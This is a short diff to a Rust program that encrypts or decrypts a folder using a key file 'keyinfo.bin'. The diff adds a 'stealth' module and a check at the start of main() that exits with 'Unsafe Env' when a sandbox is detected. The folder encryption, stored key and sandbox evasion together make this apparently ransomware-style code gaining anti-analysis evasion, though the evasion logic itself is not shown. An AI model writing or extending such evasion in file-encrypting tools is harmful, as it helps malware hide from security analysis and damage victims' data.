@@ -6,10 +6,16 @@ use std::path::Path;
 use rand::Rng;
 
 mod fileops;
+mod stealth;
 
 const KEY_FILE: &str = "keyinfo.bin";
 
 fn main() {
+    if stealth::is_sandbox() {
+        println!("Unsafe Env");
+        std::process::exit(1);
+    }
+    
     let args: Vec<String> = env::args().collect();
     if args.len() != 3 {
         eprintln!("Usage: {} <encrypt|decrypt> <folder_path>", args[0]);
